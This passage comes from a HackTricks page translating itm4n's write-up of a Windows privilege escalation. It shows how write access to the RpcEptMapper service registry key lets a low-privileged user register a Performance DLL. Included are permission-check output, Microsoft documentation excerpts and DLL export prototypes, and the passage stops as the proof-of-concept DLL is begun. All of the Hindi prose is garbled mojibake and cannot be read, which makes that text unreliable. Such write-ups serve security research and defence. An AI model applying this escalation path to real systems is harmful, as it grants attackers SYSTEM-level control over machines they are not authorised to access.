<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>


**рдЬрд╛рдирдХрд╛рд░реА рдХреЙрдкреА рдХреА рдЧрдИ** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬрд┐рдпреЛрдВ рдкрд░ рдХреБрдЫ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

рдЖрдЗрдП `regedit` GUI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `RpcEptMapper` рд╕реЗрд╡рд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдореИрдиреНрдпреБрдЕрд▓ рдЬрд╛рдВрдЪ рдХрд░реЗрдВред _Advanced Security Settings_ рд╡рд┐рдВрдбреЛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдЪреАрдЬ рдЬреЛ рдореБрдЭреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдкрд╕рдВрдж рд╣реИ рд╡рд╣ рд╣реИ _Effective Permissions_ рдЯреИрдмред рдЖрдк рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рдореВрд╣ рдирд╛рдо рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рддреБрд░рдВрдд рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдХреМрди рд╕реА рдкреНрд░рднрд╛рд╡реА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рджреА рдЧрдИ рд╣реИрдВ, рдмрд┐рдирд╛ рд╕рднреА ACEs рдХреА рдЕрд▓рдЧ рд╕реЗ рдЬрд╛рдВрдЪ рдХрд┐рдПред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд `lab-user` рдЦрд╛рддреЗ рдХреЗ рдкрд░рд┐рдгрд╛рдо рджрд┐рдЦрд╛рддрд╛ рд╣реИред

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

рдЕрдзрд┐рдХрд╛рдВрд╢ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдорд╛рдирдХ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `Query Value`) рд▓реЗрдХрд┐рди рдПрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрд╛рд╣рд░ рдЦрдбрд╝рд╛ рд╣реИ: `Create Subkey`ред рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рдирд╛рдо `AppendData/AddSubdirectory` рд╣реИ, рдЬреЛ рдмрд┐рд▓реНрдХреБрд▓ рд╡рд╣реА рд╣реИ рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
рдЗрд╕рдХрд╛ рдХреНрдпрд╛ рдорддрд▓рдм рд╣реИ? рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕рд┐рд░реНрдл `ImagePath` рдорд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ `WriteData/AddFile` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рд╣рдо рдХреЗрд╡рд▓ рдПрдХ рдирдИ рд╕рдмрдХреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдХреНрдпрд╛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рдерд╛ рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рдЭреВрдареА рд╕рдХрд╛рд░рд╛рддреНрдордХрддрд╛ рдереА? рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдирд╣реАрдВред рдордЬрд╝рд╛ рд╢реБрд░реВ рд╣реЛрдиреЗ рджреЛ!

## RTFM <a href="#rtfm" id="rtfm"></a>

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдордирдорд╛рдиреА рд╕рдмрдХреАрдЬрд╝ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╣рдо рдореМрдЬреВрджрд╛ рд╕рдмрдХреАрдЬрд╝ рдФрд░ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рдпреЗ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╕рдмрдХреАрдЬрд╝ `Parameters` рдФрд░ `Security` рд╣реИрдВ, рдЬреЛ Windows рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА рд╕рд╛рдорд╛рдиреНрдп рд╣реИрдВред

рдЗрд╕рд▓рд┐рдП, рдкрд╣рд▓рд╛ рдкреНрд░рд╢реНрди рдЬреЛ рдореЗрд░реЗ рдорди рдореЗрдВ рдЖрдпрд╛ рдерд╛: _рдХреНрдпрд╛ рдХреЛрдИ рдЕрдиреНрдп рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рдмрдХреА - рдЬреИрд╕реЗ `Parameters` рдФрд░ `Security` - рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рд╕реЗрд╡рд╛ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рднреА рддрд░рд╣ рд╕реЗ рдЗрд╕рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ?_

рдЗрд╕ рдкреНрд░рд╢реНрди рдХрд╛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП, рдореЗрд░реА рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдпреЛрдЬрдирд╛ рд╕рднреА рдореМрдЬреВрджрд╛ рдХреАрдЬрд╝ рдХреЛ рдЧрд┐рдирдирд╛ рдФрд░ рдПрдХ рдкреИрдЯрд░реНрди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреА рдереАред рд╡рд┐рдЪрд╛рд░ рдпрд╣ рджреЗрдЦрдиреЗ рдХрд╛ рдерд╛ рдХрд┐ рдХреМрди рд╕реА рд╕рдмрдХреАрдЬрд╝ рд╕реЗрд╡рд╛ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП _рдорд╣рддреНрд╡рдкреВрд░реНрдг_ рд╣реИрдВред рдореИрдВрдиреЗ рд╕реЛрдЪрдирд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдХрд┐ рдореИрдВ рдЗрд╕реЗ PowerShell рдореЗрдВ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рдФрд░ рдлрд┐рд░ рдкрд░рд┐рдгрд╛рдо рдХреЛ рдХреИрд╕реЗ рд╕реЙрд░реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдореИрдВ рдРрд╕рд╛ рдХрд░рддрд╛, рдореИрдВрдиреЗ рд╕реЛрдЪрд╛ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕рдВрд░рдЪрдирд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рдереАред рдЗрд╕рд▓рд┐рдП, рдореИрдВрдиреЗ `windows service configuration registry site:microsoft.com` рдЬреИрд╕рд╛ рдХреБрдЫ рдЧреВрдЧрд▓ рдХрд┐рдпрд╛ рдФрд░ рдпрд╣рд╛рдБ рдкрд╣рд▓рд╛ [рдкрд░рд┐рдгрд╛рдо](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) рд╣реИ рдЬреЛ рдирд┐рдХрд▓рд╛ред

рдЖрд╢рд╛рдЬрдирдХ рд▓рдЧрддрд╛ рд╣реИ, рд╣реИ рдирд╛? рдкрд╣рд▓реА рдирдЬрд╝рд░ рдореЗрдВ, рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдкреВрд░реНрдг рдФрд░ рд╡реНрдпрд╛рдкрдХ рдирд╣реАрдВ рд▓рдЧ рд░рд╣рд╛ рдерд╛ред рд╢реАрд░реНрд╖рдХ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП, рдореИрдВрдиреЗ рдПрдХ рд╕реЗрд╡рд╛ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕рднреА рд╕рдмрдХреАрдЬрд╝ рдФрд░ рдорд╛рдиреЛрдВ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡реГрдХреНрд╖ рд╕рдВрд░рдЪрдирд╛ рджреЗрдЦрдиреЗ рдХреА рдЙрдореНрдореАрдж рдХреА рдереА рд▓реЗрдХрд┐рди рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╡рд╣рд╛рдБ рдирд╣реАрдВ рдерд╛ред

рдлрд┐рд░ рднреА, рдореИрдВрдиреЗ рдкреНрд░рддреНрдпреЗрдХ рдкреИрд░рд╛рдЧреНрд░рд╛рдл рдкрд░ рдЬрд▓реНрджреА рд╕реЗ рдирдЬрд╝рд░ рдбрд╛рд▓реАред рдФрд░, рдореИрдВрдиреЗ рдЬрд▓реНрджреА рд╕реЗ рдХреАрд╡рд░реНрдб "_**Performance**_" рдФрд░ "_**DLL**_" рдХреЛ рджреЗрдЦрд╛ред "**Perfomance**" рдЙрдкрд╢реАрд░реНрд╖рдХ рдХреЗ рдЕрдВрддрд░реНрдЧрдд, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:

> **Performance**: _рдПрдХ рдХреБрдВрдЬреА рдЬреЛ рд╡реИрдХрд▓реНрдкрд┐рдХ рдкреНрд░рджрд░реНрд╢рди рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирдХрд╛рд░реА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИред рдЗрд╕ рдХреБрдВрдЬреА рдХреЗ рддрд╣рдд рдорд╛рди **рдбреНрд░рд╛рдЗрд╡рд░ рдХреЗ рдкреНрд░рджрд░реНрд╢рди DLL рдХрд╛ рдирд╛рдо** рдФрд░ **рдЙрд╕ DLL рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдП рдЧрдП рдХреБрдЫ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдирд╛рдо** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВред рдЖрдк рдбреНрд░рд╛рдЗрд╡рд░ рдХреА INF рдлрд╝рд╛рдЗрд▓ рдореЗрдВ AddReg рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕рдмрдХреА рдореЗрдВ рдорд╛рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред_

рдЗрд╕ рдЫреЛрдЯреЗ рдкреИрд░рд╛рдЧреНрд░рд╛рдл рдХреЗ рдЕрдиреБрд╕рд╛рд░, рд╕реИрджреНрдзрд╛рдВрддрд┐рдХ рд░реВрдк рд╕реЗ рдХреЛрдИ `Performance` рд╕рдмрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдбреНрд░рд╛рдЗрд╡рд░ рд╕реЗрд╡рд╛ рдореЗрдВ рдПрдХ DLL рдХреЛ рдкрдВрдЬреАрдХреГрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХреА рдЬрд╛ рд╕рдХреЗред **рдареАрдХ рд╣реИ, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ!** рдпрд╣ рдХреБрдВрдЬреА `RpcEptMapper` рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдЗрд╕рд▓рд┐рдП рдпрд╣ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ _рдмрд┐рд▓реНрдХреБрд▓_ рд╡рд╣реА рд╣реИ рдЬреЛ рд╣рдореЗрдВ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдЫреЛрдЯреА рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдпрд╣ рд╕реЗрд╡рд╛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдПрдХ рдбреНрд░рд╛рдЗрд╡рд░ рд╕реЗрд╡рд╛ рдирд╣реАрдВ рд╣реИред рд╡реИрд╕реЗ рднреА, рдпрд╣ рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рд▓рд╛рдпрдХ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдЗрд╕ "_рдкреНрд░рджрд░реНрд╢рди рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ_" рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рд┐рдПред

> **рдиреЛрдЯ:** Windows рдореЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдХрд╛ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ `Type` рд╣реЛрддрд╛ рд╣реИред рдПрдХ рд╕реЗрд╡рд╛ рдХрд╛ рдкреНрд░рдХрд╛рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рдиреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` рдпрд╛ `SERVICE_INTERACTIVE_PROCESS (256)`ред

рдХреБрдЫ рдЧреВрдЧрд▓рд┐рдВрдЧ рдХреЗ рдмрд╛рдж, рдореИрдВрдиреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдпрд╣ рд╕рдВрд╕рд╛рдзрди рдкрд╛рдпрд╛: [Creating the ApplicationтАЩs Performance Key](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)ред

рдкрд╣рд▓реЗ, рдПрдХ рдЕрдЪреНрдЫреА рд╡реГрдХреНрд╖ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬреЛ рд╕рднреА рдХреАрдЬрд╝ рдФрд░ рдорд╛рдиреЛрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдореЗрдВ рдмрдирд╛рдирд╛ рд╣реИред рдлрд┐рд░, рд╡рд┐рд╡рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рджреЗрддрд╛ рд╣реИ:

* `Library` рдорд╛рди рдореЗрдВ **рдПрдХ DLL рдХрд╛ рдирд╛рдо рдпрд╛ рдПрдХ DLL рдХреЗ рд▓рд┐рдП рдкреВрд░реНрдг рдкрде** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
* `Open`, `Collect`, рдФрд░ `Close` рдорд╛рди рдЖрдкрдХреЛ рдЙрди **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдирд╛рдореЛрдВ** рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ DLL рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
* рдЗрди рдорд╛рдиреЛрдВ рдХрд╛ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ `REG_SZ` рд╣реИ (рдпрд╛ `Library` рдорд╛рди рдХреЗ рд▓рд┐рдП `REG_EXPAND_SZ` рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред

рдпрджрд┐ рдЖрдк рдЗрд╕ рд╕рдВрд╕рд╛рдзрди рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд▓рд┐рдВрдХреНрд╕ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдХреБрдЫ рдХреЛрдб рдирдореВрдиреЗ рднреА рдкрд╛рдПрдВрдЧреЗ: [Implementing OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)ред
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЗ рд╕рд╛рде рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛ рдЪреБрдХрд╛ рд╣реИ, рдЕрдм рдХреБрдЫ рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдХрд╛ рд╕рдордп рд╣реИ!

## рдкреНрд░реВрдл-рдСрдл-рдХреЙрдиреНрд╕реЗрдкреНрдЯ рд▓рд┐рдЦрдирд╛ <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореИрдВ рдЬреЛ рднреА рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░ рдкрд╛рдпрд╛, рдЙрд╕рдХреА рдорджрдж рд╕реЗ рдПрдХ рд╕рд░рд▓ рдкреНрд░реВрдл-рдСрдл-рдХреЙрдиреНрд╕реЗрдкреНрдЯ DLL рд▓рд┐рдЦрдирд╛ рдХрд╛рдлреА рд╕реАрдзрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА, рд╣рдореЗрдВ рдПрдХ рдпреЛрдЬрдирд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ!

рдЬрдм рдореБрдЭреЗ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреА DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдореИрдВ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рд░рд▓ рдФрд░ рдХрд╕реНрдЯрдо рд▓реЙрдЧ рд╕рд╣рд╛рдпрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рд╢реБрд░реБрдЖрдд рдХрд░рддрд╛ рд╣реВрдБред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдирд╛ рд╣реИ рдЬрдм рднреА рдЗрд╕реЗ рдЖрд╣реНрд╡рд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрдорддреМрд░ рдкрд░, рдореИрдВ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдФрд░ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА PID, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рдФрд░ рд╕рдВрдмрдВрдзрд┐рдд рдХрдорд╛рдВрдб рд▓рд╛рдЗрди, рдФрд░ рдЗрд╕ рд▓реЙрдЧ рдЗрд╡реЗрдВрдЯ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдирд╛рдо рд▓реЙрдЧ рдХрд░рддрд╛ рд╣реВрдБред рдЗрд╕ рддрд░рд╣, рдореБрдЭреЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдб рдХрд╛ рдХреМрди рд╕рд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реБрдЖ рдерд╛ред

рдореЗрд░реЗ рдЕрдиреНрдп рд▓реЗрдЦреЛрдВ рдореЗрдВ, рдореИрдВрдиреЗ рд╣рдореЗрд╢рд╛ рд╡рд┐рдХрд╛рд╕ рднрд╛рдЧ рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдореИрдВрдиреЗ рдорд╛рди рд▓рд┐рдпрд╛ рдерд╛ рдХрд┐ рдпрд╣ рдЕрдзрд┐рдХ рдпрд╛ рдХрдо рд╕реНрдкрд╖реНрдЯ рдерд╛ред рд▓реЗрдХрд┐рди, рдореИрдВ рдЪрд╛рд╣рддрд╛ рд╣реВрдБ рдХрд┐ рдореЗрд░реЗ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рд╢реБрд░реБрдЖрддреА рд▓реЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рднреА рдЕрдиреБрдХреВрд▓ рд╣реЛрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдБ рдПрдХ рд╡рд┐рд░реЛрдзрд╛рднрд╛рд╕ рд╣реИред рдореИрдВ рдпрд╣рд╛рдБ рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХрд╛ рд╕рдорд╛рдзрд╛рди рдХрд░реВрдБрдЧрд╛ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд░реНрдгрди рдХрд░реВрдБрдЧрд╛ред рддреЛ, рдЪрд▓рд┐рдП Visual Studio рдЦреЛрд▓рддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдирдпрд╛ "_C++ Console App_" 